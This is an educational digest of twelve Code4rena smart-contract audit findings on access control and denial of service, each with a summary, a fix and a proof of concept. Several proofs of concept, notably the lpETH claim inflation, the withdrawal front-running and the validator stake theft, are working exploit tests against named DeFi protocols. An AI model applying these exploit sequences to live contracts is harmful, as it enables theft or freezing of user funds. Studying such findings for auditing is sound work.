# ETAAcademy-Adudit: 3. Access

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>03. Access</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>dos</th>
          <td>access</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1. [High] Dual transaction nature of composed message transfer allows anyone to steal user funds

### Restricts the lzCompose(…) method

- Summary: Sending OFTs via `lzCompose(…)` is permissionless, allowing anyone to invoke it. Adversaries can monitor for incoming OFTs and use them before legitimate processing, stealing user funds. If `lzCompose(…)` fails, adversaries can exploit retries before users, misusing the OFTs.

- Impact & Recommendation: An immediate but temporary fix restricts the lzCompose(…) method to trusted or whitelisted executors. Alternatively, a design change is proposed, involving directly implementing `lzReceive(…)` to eliminate the need for a composed message altogether.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-canto#h-02-dual-transaction-nature-of-composed-message-transfer-allows-anyone-to-steal-user-funds) & [Report](https://code4rena.com/reports/2024-03-canto)

  <details><summary>POC</summary>

  ```solidity
    it("lzCompose: successful deposit and send on canto", async () => {
        // update whitelist
        await ASDUSDC.updateWhitelist(USDCOFT.target, true);
        // call lzCompose with valid payload
        await expect(
            ASDRouter.lzCompose(
                USDCOFT.target,
                guid,
                generatedComposeMsg(
                    refundAddress,
                    amountUSDCSent,
                    generatedRouterPayload(cantoLzEndpoint.id, refundAddress, TESTASD.target, TESTASD.target, "0", refundAddress, "0")
                ),
                executorAddress,
                "0x"
            )
        )
            .to.emit(ASDRouter, "ASDSent")
            .withArgs(guid, refundAddress, TESTASD.target, amountUSDCSent, cantoLzEndpoint.id, false);
        // expect ASD to be sent to canto
        expect(await TESTASD.balanceOf(refundAddress)).to.equal(amountUSDCSent);
    });

  ```

  </details>

## 2. [Medium] ASDRouter didn’t call ASDUSDC.approve() to to grant permission for crocSwapAddress to spend their ASDUSDC

### Lack of allowance

- Summary: The function `ASDRouter#lzCompose()` fails because the necessary allowance is not set for `crocSwapAddres**s**` to spend ASDUSDC tokens. This prevents the successful swap of ASDUSDC for NOTE, resulting in a failed execution of `_swapOFTForNote()` and refunding all ASDUSDC to the designated receiver.

- Impact & Recommendation: Set `allowance` to the maximum value.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-canto#m-02-asdrouter-didnt-call-asdusdcapprove-to-to-grant-permission-for-crocswapaddress-to-spend-their-asdusdc) & [Report](https://code4rena.com/reports/2024-03-canto)

  <details><summary>POC</summary>

  ```solidity
    const { expect } = require("chai");
    const { ethers } = require("hardhat");
    const hre = require("hardhat");
    describe("Dex", function () {
        const dexAddress = "0x9290C893ce949FE13EF3355660d07dE0FB793618";
        const usdcAddress = "0x80b5a32E4F032B2a058b4F29EC95EEfEEB87aDcd";
        const cNoteAddress = "0xEe602429Ef7eCe0a13e4FfE8dBC16e101049504C";
        const usdcWhaleAddress = "0xfAc5EBD2b1b830806189FCcD0255DC9B174decbc";
        let dex;
        let usdc;
        let cNote;
        this.beforeEach(async () => {
            dex  = await hre.ethers.getContractAt("ICrocSwapDex", dexAddress);
            usdc = await hre.ethers.getContractAt("IERC20", usdcAddress);
            cNote = await hre.ethers.getContractAt("CErc20Interface", cNoteAddress);
        });
        it("User can only call DEX.swap() for cNote after call USDC.approve(dex)", async () => {
            await hre.network.provider.request({
                method: "hardhat_impersonateAccount",
                params: [usdcWhaleAddress],
            });
            whale = await ethers.getSigner(usdcWhaleAddress);
            let usdcBalanceBeforeSwap = await usdc.balanceOf(usdcWhaleAddress);
            await usdc.connect(whale).approve(dexAddress, 0);
            expect(await usdc.allowance(usdcWhaleAddress,dexAddress)).to.be.equal(0);
            //@audit-info swap failed due to zero allowance
            expect(dex.connect(whale).swap(
                usdcAddress,
                cNoteAddress,
                36000,
                true,
                true,
                2000000,
                0,
                0,
                0,
                0
            )).to.be.reverted;
            //@audit-info user set the allowance for dex to 2000000
            await usdc.connect(whale).approve(dexAddress, 2000000);
            expect(await usdc.allowance(usdcWhaleAddress,dexAddress)).to.be.equal(2000000);
            swapTx = await dex.connect(whale).swap(
                usdcAddress,
                cNoteAddress,
                36000,
                true,
                true,
                2000000,
                0,
                ethers.parseEther("10000000000"),
                0,
                0
            );
            await swapTx.wait();
            let usdcBalanceAfterSwap = await usdc.balanceOf(usdcWhaleAddress);
            let usedUSDC = usdcBalanceBeforeSwap - usdcBalanceAfterSwap;
            //@audit-info swap succeeded and 2000000 of USDC was tranferred from user
            expect(usedUSDC).to.be.equal(2000000);
        });
    });

  ```

  </details>

## 3.[High] DOS of completeQueuedWithdrawal when ERC20 buffer is filled

### Restricted access

- Summary: The OperatorDelegator::completeQueuedWithdrawal function in the code tries to fill the ERC20 withdrawal buffer but fails because it calls depositQueue::fillERC20withdrawBuffer, which is restricted to be accessed only by the RestakeManager contract. This restriction causes the function call to revert, leading to a Denial of Service (DoS) that prevents the completion of withdrawals and the retrieval of funds from EigenLayer (EL), resulting in a potential loss of funds for the protocol and its users.

- Impact & Recommendation: The simplest solution is to remove the onlyRestakeManager modifier from the depositQueue::fillERC20withdrawBuffer function, allowing anyone to call it.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-renzo#h-07-dos-of-completequeuedwithdrawal-when-erc20-buffer-is-filled) & [Report](https://code4rena.com/reports/2024-04-renzo)

  <details><summary>POC</summary>

  ```solidity
    function completeQueuedWithdrawal(
        IDelegationManager.Withdrawal calldata withdrawal,
        IERC20[] calldata tokens,
        uint256 middlewareTimesIndex
    ) external nonReentrant onlyNativeEthRestakeAdmin {
        uint256 gasBefore = gasleft();
        if (tokens.length != withdrawal.strategies.length) revert MismatchedArrayLengths();
        // Complete the queued withdrawal from EigenLayer with receiveAsToken set to true
        delegationManager.completeQueuedWithdrawal(withdrawal, tokens, middlewareTimesIndex, true);
        IWithdrawQueue withdrawQueue = restakeManager.depositQueue().withdrawQueue();
        for (uint256 i; i < tokens.length; ) {
            if (address(tokens[i]) == address(0)) revert InvalidZeroInput();
            // Deduct queued shares for tracking TVL
            queuedShares[address(tokens[i])] -= withdrawal.shares[i];
            // Check if the token is not Native ETH
            if (address(tokens[i]) != IS_NATIVE) {
                // Check the withdrawal buffer and fill if below buffer target
                uint256 bufferToFill = withdrawQueue.getBufferDeficit(address(tokens[i]));
                // Get the balance of this contract
                uint256 balanceOfToken = tokens[i].balanceOf(address(this));
                if (bufferToFill > 0) {
                    bufferToFill = (balanceOfToken <= bufferToFill) ? balanceOfToken : bufferToFill;
                    // Update the amount to send to the operator Delegator
                    balanceOfToken -= bufferToFill;
                    // Safely approve for depositQueue
                    tokens[i].safeApprove(address(restakeManager.depositQueue()), bufferToFill);
                    // Fill the Withdraw Buffer via depositQueue
                    restakeManager.depositQueue().fillERC20withdrawBuffer(
                        address(tokens[i]),
                        bufferToFill
                    );
                }
                // Deposit remaining tokens back to EigenLayer
                if (balanceOfToken > 0) {
                    _deposit(tokens[i], balanceOfToken);
                }
            }
            unchecked {
                ++i;
            }
        }
        // Emit the Withdraw Completed event with withdrawalRoot
        emit WithdrawCompleted(
            delegationManager.calculateWithdrawalRoot(withdrawal),
            withdrawal.strategies,
            withdrawal.shares
        );
        // Record the current spent gas
        _recordGas(gasBefore);
    }

  ```

  </details>

## 4.[High] Availability of deposit invariant can be bypassed

### ETH deposits influence lpETH minting

- Summary: The issue in the PrelaunchPoints.sol contract arises during the claiming of lpETH, where non-ETH/WETH LRT tokens are swapped to ETH using \_fillQuote(), and this ETH is subsequently used to mint lpETH. The vulnerability occurs because any ETH transferred directly to the contract before calling claim() is also included in the minting calculation. This allows users to bypass the intended lock-up period and artificially inflate their lpETH holdings beyond their initial LRT stake.

- Impact & Recommendation: To mitigate this, it is crucial to modify the contract so that only ETH obtained from LRT swaps is used for minting lpETH, and to prevent any additional ETH deposits from influencing the lpETH minting process.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-loop#h-01-availability-of-deposit-invariant-can-be-bypassed) & [Report](https://code4rena.com/reports/2024-05-loop)

  <details><summary>POC</summary>

  ```solidity
      function testClaimLRT() public {
        // user only needs to lock 1 wei LRT, then he could cliam any amount he want
        uint256 lockAmount = 1;
        lrt.approve(address(prelaunchPoints), lockAmount);
        prelaunchPoints.lock(address(lrt), lockAmount, referral);

        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        vm.warp(prelaunchPoints.startClaimDate() + 1);
        bytes4 y =  bytes4(0x415565b0);
        bytes memory da = abi.encodeWithSelector(y, address(lrt), (ETH), 0);
        // user deposit eth to this and call claim to get lp
        address(prelaunchPoints).call{value: 1 ether}("");
        prelaunchPoints.claim(address(lrt), 0, PrelaunchPoints.Exchange.TransformERC20, da);

        console.log("lp get : ",lpETH.balanceOf(address(this)));
    }

  ```

  </details>

## 5.[High] Attacker can frontrun user’s withdrawals to make them revert without costs

### Valid nft owner

- Summary: The `withdraw` method can be indefinitely blocked by repeatedly depositing 1 WEI with others' IDs just before each block, preventing withdrawals and creating a denial-of-service attack at minimal cost.

- Impact & Recommendation: Mitigations include preventing deposits to unowned dNFT tokens, allowing deposits only through licensed vaults to impose a real cost on attackers, and updating `idToBlockOfLastDeposit` only for vaults licensed by `vaultLicenser` or `keroseneManager`.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-dyad#h-04-attacker-can-frontrun-users-withdrawals-to-make-them-revert-without-costs) & [Report](https://code4rena.com/reports/2024-04-dyad)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity =0.8.17;
    import "forge-std/console.sol";
    import "forge-std/Test.sol";
    import {DeployV2, Contracts} from "../../script/deploy/Deploy.V2.s.sol";
    import {Licenser}            from "../../src/core/Licenser.sol";
    import {Parameters}          from "../../src/params/Parameters.sol";
    import {ERC20}               from "@solmate/src/tokens/ERC20.sol";
    import {Vault}               from "../../src/core/Vault.sol";
    import {IAggregatorV3}       from "../../src/interfaces/IAggregatorV3.sol";
    import {IVaultManager}       from "../../src/interfaces/IVaultManager.sol";
    contract FakeERC20 is ERC20 {
        constructor(string memory name, string memory symbol) ERC20(name, symbol, 18) {}
        function mint(address to, uint256 amount) external {
            _mint(to, amount);
        }
    }
    contract FakeVaultTest is Test, Parameters {
        Contracts contracts;
        address   attacker;
        FakeERC20 fakeERC20;
        Vault     fakeVault;
        function setUp() public {
            contracts = new DeployV2().run();
            // Add Vault Manager V2 to the main licenser used by DYAD token, it will allow Vault Manager V2 minting, burning DYAD.
            vm.prank(MAINNET_OWNER);
            Licenser(MAINNET_VAULT_MANAGER_LICENSER).add(address(contracts.vaultManager));
            attacker =  makeAddr('attacker');
            fakeERC20 = new FakeERC20('Fake', 'FAKE');
            fakeVault = new Vault(
                contracts.vaultManager,
                ERC20        (fakeERC20),
                IAggregatorV3(address(0x0))
            );
            fakeERC20.mint(attacker, type(uint256).max);
        }
        function testPoC_attackerCanFrontRunUserWithdrawalsToPreventThemFromWithdrawing() public {
            // Make a new address for alice, and mint some ether.
            address alice = makeAddr('alice');
            vm.deal(alice, 2 ether);
            // Misc addresses (WETH and WETH Vault).
            address weth =     address(contracts.ethVault.asset());
            address ethVault = address(contracts.ethVault);
            // Alice start interaction
            vm.startPrank(alice);
            // Mint new dNft token for alice
            uint dNftId = contracts.vaultManager.dNft().mintNft{value: 1 ether}(alice);
            // Add WETH vault to the newly created dNft
            contracts.vaultManager.add(dNftId, ethVault);
            // Deposit Ether to WETH contract to mint weth tokens
            (bool success, ) = weth.call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
            require(success);
            // Deposit Weth to vault through Vault Manager
            contracts.ethVault.asset().approve(address(contracts.vaultManager), 1 ether);
            contracts.vaultManager.deposit(dNftId, ethVault, 1 ether);
            vm.stopPrank();
            vm.roll(block.number + 1);
            // attacker approve vault manager to spend his fake erc20
            vm.startPrank(attacker);
            fakeVault.asset().approve(address(contracts.vaultManager), type(uint256).max);
            // whenever alice try to withdraw, attacker front-runs alice and make him unable to withdraw at current block
            // by depositing to alice's dNft a fake token with fake vault
            contracts.vaultManager.deposit(dNftId, address(fakeVault), 1 ether);
            vm.stopPrank();
            // alice try to withdraw but the call reverted with DepositedInSameBlock error
            // indicate that the attacker success to prevent the withdrawal
            vm.expectRevert(IVaultManager.DepositedInSameBlock.selector);
            vm.prank(alice);
            contracts.vaultManager.withdraw(dNftId, ethVault, 1 ether, alice);
        }
    }

  ```

  </details>

## 6.[Medium] VestingMaster: Banning account causes future rewards in RevenueSharingVault to get lost and tokens are stuck

### Ban accounts

- Summary: In the VestingMaster and IndividualVestingVault contracts, the owner of VestingMaster can ban accounts from calling IndividualVestingVault.claim(). This prevents the banned accounts from withdrawing their shares, causing these shares to remain indefinitely in the vault. Consequently, any future revenue generated by these shares is lost forever.

- Impact & recommendation: When an account is banned, its Vault shares are now redeemed for TRNDO tokens and sent to the owner of VestingMaster, ensuring no TRNDO tokens get stuck and future revenue is preserved.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-tornadoblast-proleague#m-01-vestingmaster-banning-account-causes-future-rewards-in-revenuesharingvault-to-get-lost-and-tokens-are-stuck) & [Report](https://code4rena.com/reports/2024-06-tornadoblast-proleague)

<details><summary>POC</summary>

```solidity
    --- a/apps/contracts/src/Vesting/IndividualVestingVault.sol
    +++ b/apps/contracts/src/Vesting/IndividualVestingVault.sol
    @@ -42,6 +42,10 @@ contract IndividualVestingVault is VestingUtils, Initializable {
            tokenizedVault.withdraw(amountToClaim, msg.sender, address(this));
        }
    +    function banAccount() external onlyVestingMaster() {
    +        tokenizedVault.redeem(tokenizedVault.balanceOf(address(this)), msg.sender, address(this));
    +    }
    +
        function claimableTokenAmount() public view returns (uint256) {
            if (vaultIsBanned()) {
                return 0;
    --- a/apps/contracts/src/Vesting/VestingMaster.sol
    +++ b/apps/contracts/src/Vesting/VestingMaster.sol
    @@ -36,9 +36,14 @@ contract VestingMaster is IVestingMaster, VestingUtils, Ownable, MinimalProxyFac
            }
        }
    +    function withdrawTornadoTokens(address recipient) external onlyOwner {
    +        vestedToken.transfer(recipient, vestedToken.balanceOf(address(this)));
    +    }
    +
        function banAccount(address account) external onlyOwner {
            require(!claimingIsProhibitedFor[account]);
            claimingIsProhibitedFor[account] = true;
    +        vaultOf[account].banAccount();
        }

```

</details>

## 7.[High] Adversary can make honest parties unable to retrieve their assertion stakes if the required amount is decreased

### Validators steal funds

- Summary: The vulnerability in RollupUserLogic.sol allows adversary validators who have lost a challenge to steal funds from honest validators by exploiting the setBaseStake function. When the baseStake is decreased, the adversary can manipulate the system by creating new assertions with a reduced stake, ultimately allowing them to withdraw more funds than they initially staked.

- Impact & Recommendation: This flaw permits adversaries to exploit the system and steal from honest validators, necessitating a fix to prevent adversary validators from reclaiming their funds through the current tracking system.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-arbitrum-foundation#h-01-adversary-can-make-honest-parties-unable-to-retrieve-their-assertion-stakes-if-the-required-amount-is-decreased) & [Report](https://code4rena.com/reports/2024-05-arbitrum-foundation)

<details><summary>POC</summary>

```solidity
    function testSuccessSetBaseStake() public {
        vm.prank(upgradeExecutorAddr);
        adminRollup.setBaseStake(8);
    }
    function testPOC_SuccessConfirmEdgeByTime() public returns (SuccessCreateChallengeData memory) {
        SuccessCreateChallengeData memory data = testSuccessCreateChallenge();

        vm.roll(userRollup.getAssertion(genesisHash).firstChildBlock + CONFIRM_PERIOD_BLOCKS + 1);
        vm.warp(block.timestamp + CONFIRM_PERIOD_BLOCKS * 15);
        userRollup.challengeManager().confirmEdgeByTime(
            data.e1Id,
            AssertionStateData(
                data.afterState1,
                genesisHash,
                userRollup.bridge().sequencerInboxAccs(0)
            )
        );
        bytes32 inboxAcc = userRollup.bridge().sequencerInboxAccs(0);
        vm.roll(block.number + userRollup.challengeGracePeriodBlocks());
        vm.prank(validator1);
        userRollup.confirmAssertion(
            data.assertionHash,
            genesisHash,
            data.afterState1,
            data.e1Id,
            ConfigData({
                wasmModuleRoot: WASM_MODULE_ROOT,
                requiredStake: BASE_STAKE,
                challengeManager: address(challengeManager),
                confirmPeriodBlocks: CONFIRM_PERIOD_BLOCKS,
                nextInboxPosition: firstState.globalState.u64Vals[0]
            }),
            inboxAcc
        );
        return data;
    }

    function readStakerMap(
        address addr
    )
        public
        returns (
            uint256 amountStaked,
            bytes32 latestStakedAssertion,
            uint64 index,
            bool isStaked,
            address withdrawalAddress
        )
    {
        return (userRollup._stakerMap(addr));
    }

    function testRun_Me_POC() public {
        /*****************
         *****Step -1-*****
         *****************/
        SuccessCreateChallengeData memory data = testPOC_SuccessConfirmEdgeByTime();
        /*@audit-info
        - `validator1` is the honest validator
        - `validator2` is the adversary validator (aka: Bob)
        - `validator3` is the adversary validator (aka: Alice)
        at this point:
        Bob lose a challenge and his 10 wei (which is the value of the constant `BASE_STAKE`)*/

        /*****************
         *****Step -2-*****
         *****************/
        //Set-up
        uint256 prevInboxCount = data.newInboxCount;
        bytes32 prevHash = userRollup.latestConfirmed();
        AssertionState memory beforeState;
        beforeState = data.afterState1;

        AssertionState memory afterState;
        afterState.machineStatus = MachineStatus.FINISHED;
        afterState.globalState.u64Vals[0] = uint64(prevInboxCount);

        bytes32 inboxAcc = userRollup.bridge().sequencerInboxAccs(1); // 1 because we moved the position within message
        bytes32 expectedAssertionHash = RollupLib.assertionHash({
            parentAssertionHash: prevHash,
            afterState: afterState,
            inboxAcc: inboxAcc
        });

        bytes32 prevInboxAcc = userRollup.bridge().sequencerInboxAccs(0);

        //The honest validator creats the next assertion
        vm.prank(validator1);
        userRollup.stakeOnNewAssertion({
            assertion: AssertionInputs({
                beforeStateData: BeforeStateData({
                    sequencerBatchAcc: prevInboxAcc,
                    prevPrevAssertionHash: genesisHash,
                    configData: ConfigData({
                        wasmModuleRoot: WASM_MODULE_ROOT,
                        requiredStake: BASE_STAKE,
                        challengeManager: address(challengeManager),
                        confirmPeriodBlocks: CONFIRM_PERIOD_BLOCKS,
                        nextInboxPosition: afterState.globalState.u64Vals[0]
                    })
                }),
                beforeState: beforeState,
                afterState: afterState
            }),
            expectedAssertionHash: expectedAssertionHash
        });

        /*****************
         *****Step -3-*****
         *****************/
        //The admin call setBaseStake() to decrease the `baseStake` state variable from 10 wei to 8 wei
        testSuccessSetBaseStake();

        /*****************
         *****Step -4-*****
         *****************/
        //Set-up
        beforeState = data.afterState2;
        afterState.machineStatus = MachineStatus.FINISHED;
        afterState.globalState.u64Vals[0] = uint64(prevInboxCount);

        // `Alice` the adversary validator creats the next assertion
        vm.prank(validator3);
        userRollup.newStakeOnNewAssertion({
            tokenAmount: BASE_STAKE,
            assertion: AssertionInputs({
                beforeStateData: BeforeStateData({
                    sequencerBatchAcc: prevInboxAcc,
                    prevPrevAssertionHash: genesisHash,
                    configData: ConfigData({
                        wasmModuleRoot: WASM_MODULE_ROOT,
                        requiredStake: BASE_STAKE,
                        challengeManager: address(challengeManager),
                        confirmPeriodBlocks: CONFIRM_PERIOD_BLOCKS,
                        nextInboxPosition: afterState.globalState.u64Vals[0]
                    })
                }),
                beforeState: beforeState,
                afterState: afterState
            }),
            expectedAssertionHash: bytes32(0),
            withdrawalAddress: validator3Withdrawal
        });

        //nb:You can check. the adversary validator `Bob` is able to withdraw his 10 wei
        /*vm.prank(validator2);
        userRollup.returnOldDeposit();*/

        /*****************
         *****Step -5-*****
         *****************/
        //`Bob` trigger `reduceDeposit()` to reduce his staked amount only to 8 wei
        vm.prank(validator2);
        userRollup.reduceDeposit(8);

        /*****************
         *****Step -6-*****
         *****************/
        //`Bob` invoke stakeOnNewAssertion() to create the first child of Alice assertion
        //Note: `Bob` will lock only 8 wei this time

        //Set-up
        (, bytes32 latestStakedAssertion, , , ) = readStakerMap(validator2);
        uint64 newInboxCount = uint64(_createNewBatch());

        beforeState = afterState;
        prevInboxAcc = userRollup.bridge().sequencerInboxAccs(1);

        AssertionState memory afterStatePOC;
        afterStatePOC.machineStatus = MachineStatus.FINISHED;
        afterStatePOC.globalState.bytes32Vals[0] = keccak256(
            abi.encodePacked(FIRST_ASSERTION_BLOCKHASH)
        ); // blockhash
        afterStatePOC.globalState.bytes32Vals[1] = keccak256(
            abi.encodePacked(FIRST_ASSERTION_SENDROOT)
        ); // sendroot
        afterStatePOC.globalState.u64Vals[0] = newInboxCount; // inbox count
        afterStatePOC.globalState.u64Vals[1] = 0; // pos in msg

        vm.roll(block.number + 75);

        vm.prank(validator2);

        userRollup.stakeOnNewAssertion({
            assertion: AssertionInputs({
                beforeStateData: BeforeStateData({
                    sequencerBatchAcc: prevInboxAcc,
                    prevPrevAssertionHash: latestStakedAssertion,
                    configData: ConfigData({
                        wasmModuleRoot: WASM_MODULE_ROOT,
                        requiredStake: 8,
                        challengeManager: address(challengeManager),
                        confirmPeriodBlocks: CONFIRM_PERIOD_BLOCKS,
                        nextInboxPosition: afterStatePOC.globalState.u64Vals[0]
                    })
                }),
                beforeState: beforeState,
                afterState: afterStatePOC
            }),
            expectedAssertionHash: bytes32(0)
        });

        /*****************
         *****Step -7-*****
         *****************/
        //Alice withdraw 10 wei
        vm.prank(validator3);
        userRollup.returnOldDeposit();

        vm.prank(validator3Withdrawal);
        uint amountWithdrawn = userRollup.withdrawStakerFunds();
        assertEq(amountWithdrawn, 10);

        //Bob withdraw 2 wei
        vm.prank(validator2Withdrawal);
        amountWithdrawn = userRollup.withdrawStakerFunds();
        assertEq(amountWithdrawn, 2);
    }


```

</details>

## 8.[Medium] BalancerFlashLender#receiveFlashLoan does not validate the originalCallData

### validate originalCallData

- Summary: The `BalancerFlashLender::receiveFlashLoan` function fails to validate the `originalCallData`, allowing an attacker to execute arbitrary Strategy instructions. This vulnerability enables an attacker to initiate a flash loan from another contract and execute any function such as `_supplyBorrow`, `_repayAndWithdraw`, or `_payDebt` within StrategyLeverage.

- Impact & Recommendation: To mitigate this, the `BalancerFlashLender::flashLoan` function should record the parameters called via a hash and verify this hash in the `receiveFlashLoan` function.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-bakerfi#m-08-balancerflashlenderreceiveflashloan-does-not-validate-the-originalcalldata) & [Report](https://code4rena.com/reports/2024-05-bakerfi)

<details><summary>POC</summary>

```solidity
   function receiveFlashLoan(address[] memory tokens,
        uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData
    ) external {
 @>     if (msg.sender != address(_balancerVault)) revert InvalidFlashLoadLender();
        if (tokens.length != 1) revert InvalidTokenList();
        if (amounts.length != 1) revert InvalidAmountList();
        if (feeAmounts.length != 1) revert InvalidFeesAmount();
        //@audit originalCallData is not verified
        (address borrower, bytes memory originalCallData) = abi.decode(userData, (address, bytes));
        address asset = tokens[0];
        uint256 amount = amounts[0];
        uint256 fee = feeAmounts[0];
        // Transfer the loan received to borrower
        IERC20(asset).safeTransfer(borrower, amount);
@>      if (IERC3156FlashBorrowerUpgradeable(borrower).onFlashLoan(borrower,
                tokens[0], amounts[0], feeAmounts[0], originalCallData
            ) != CALLBACK_SUCCESS
        ) {
            revert BorrowerCallbackFailed();
        }
        ....
    }

```

</details>

## 9.[High] validateAndUpdateVaultStakeInDSS() forwards incorrect operator address to finishUpdateStakeHook()

### `msg.sender` as the operator address

- Summary: A vulnerability in the `validateAndUpdateVaultStakeInDSS` function of the `DSS` protocol incorrectly forwards the `msg.sender` as the operator address to the `finishUpdateStakeHook`. This can lead to unauthorized addresses being treated as operators, potentially causing incorrect registration for rewards or other associated logic.

- Impact & Recommendation: it is recommended to include the operator address in the `QueuedStakeUpdate` structure and forward the correct operator address to the `finishUpdateStakeHook` in `validateAndUpdateVaultStakeInDSS`.
  <br> 🐬: [Source](<https://code4rena.com/reports/2024-06-karak-pro-league#lines-of-code#h-03-validateAndUpdateVaultStakeInDSS()-forwards-incorrect-operator-address-to-finishUpdateStakeHook()>) & [Report](https://code4rena.com/reports/2024-06-karak-pro-league)

<details><summary>POC</summary>

```solidity
    function finishUpdateStakeHook(address operator) external;

    ...
        HookLib.callHookIfInterfaceImplemented(
        dss,
        abi.encodeWithSelector(dss.finishUpdateStakeHook.selector, msg.sender),
        dss.finishUpdateStakeHook.selector,
        true,
        Constants.DEFAULT_HOOK_GAS
    );
    ...

    /// @notice Allows anyone to finish the queued request for an operator to update assets delegated to a DSS
    /// @dev Only operator can finish their queued request valid only after a
    /// minimum delay of `Constants.MIN_STAKE_UPDATE_DELAY` after starting the request
    function finalizeUpdateVaultStakeInDSS(Operator.QueuedStakeUpdate memory queuedStake, address operator)
    ...

```

</details>

## 10.[High] Arbitrary tokens and data can be bridged to GnosisTargetDispenserL2 to manipulate staking incentives

### not verify the message or the token received

- Summary: The `GnosisTargetDispenserL2` contract can be exploited because its `onTokenBridged()` callback does not verify the sender of message or the token received. This allows attackers to send any tokens with fake staking data, which the contract processes as valid, leading to potential redistribution of withheld funds or storage of amounts for later redemption.

- Impact & Recommendation: It is recommended to separate token bridging and staking data transmission, removing the `onTokenBridged()` callback to ensure staking data is validated from an authentic L1 source.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-olas#h-02-arbitrary-tokens-and-data-can-be-bridged-to-gnosistargetdispenserl2-to-manipulate-staking-incentives) & [Report](https://code4rena.com/reports/2024-05-olas)

<details><summary>POC</summary>

```solidity

    function onTokenBridged(address, uint256, bytes calldata data) external {
        // Check for the message to come from the L2 token relayer
        if (msg.sender != l2TokenRelayer) {
            revert TargetRelayerOnly(msg.sender, l2TokenRelayer);
        }

        // Process the data
        _receiveMessage(l2MessageRelayer, l1DepositProcessor, data);
    }

```

</details>

## 11.[High] Unauthorized Access to setCurves Function

### Modifiers like `onlyOwner` or `onlyManager`

- Summary: The `FeeSplitter.sol` contract has a critical vulnerability in the `setCurves` function, allowing any user to update the reference to the Curves contract. This can be exploited by attackers to redirect the reference to a malicious Curves contract, enabling manipulation of token balances and supplies. As a result, attackers can falsely inflate their claimable fees, leading to unauthorized profit.

- Impact & Recommendation: The `setCurves` function should be restricted to be callable only by the contract owner or a trusted manager using appropriate access control modifiers like `onlyOwner` or `onlyManager`.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-curves#h-04-unauthorized-access-to-setcurves-function) & [Report](https://code4rena.com/reports/2024-01-curves)

<details><summary>POC</summary>

```solidity
function setCurves(Curves curves_) public onlyOwner {
    curves = curves_;
}

function setCurves(Curves curves_) public onlyManager {
    curves = curves_;
}

```

</details>

## 12.[High] Merging tranches could make \_loanTermination() accounting incorrect

### No access control of loanId changes distrupt accouting logic

- Summary: The issue arises when tranches in the `Loan` contract are merged by the `mergeTranches()` function, altering the `loanId` of the merged tranches. This process is currently unrestricted, allowing anyone to trigger it. Such changes can disrupt the accounting logic of the `Pool` contract, which relies on the `loanId` for accurate internal accounting.

- Impact & Recommendation: The recommended mitigation is to restrict the `mergeTranches()` function so that only lenders can call it, ensuring accountability.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-gondi#h-01-merging-tranches-could-make-_loantermination-accounting-incorrect-) & [Report](https://code4rena.com/reports/2024-04-gondi)

<details><summary>POC</summary>

```solidity
function _loanTermination(
    ...
) private {
    uint256 pendingIndex = _pendingQueueIndex;
    uint256 totalQueues = getMaxTotalWithdrawalQueues + 1;
    uint256 idx;
    /// @dev oldest queue is the one after pendingIndex
    uint256 i;
    for (i = 1; i < totalQueues;) {
        idx = (pendingIndex + i) % totalQueues;
        if (getLastLoanId[idx][_loanContract] >= _loanId) {
            break;
        }
        unchecked {
            ++i;
        }
    }
    /// @dev We iterated through all queues and never broke, meaning it was issued after the newest one.
    if (i == totalQueues) {
        _outstandingValues =
            _updateOutstandingValuesOnTermination(_outstandingValues, _principalAmount, _apr, _interestEarned);
        return;
    } else {
        uint256 pendingToQueue =
            _received.mulDivDown(PRINCIPAL_PRECISION - _queueAccounting[idx].netPoolFraction, PRINCIPAL_PRECISION);
        getTotalReceived[idx] += _received;
        getAvailableToWithdraw += pendingToQueue;
        _queueOutstandingValues[idx] = _updateOutstandingValuesOnTermination(
            _queueOutstandingValues[idx], _principalAmount, _apr, _interestEarned
        );
    }
}

tranche[_minTranche] = IMultiSourceLoan.Tranche(
    _newLoanId, // @audit can be used to change loanId
    _loan.tranche[_minTranche].floor,
    principalAmount,
    lender,
    accruedInterest,
    startTime,
    cumAprBps / principalAmount
);

```

</details>
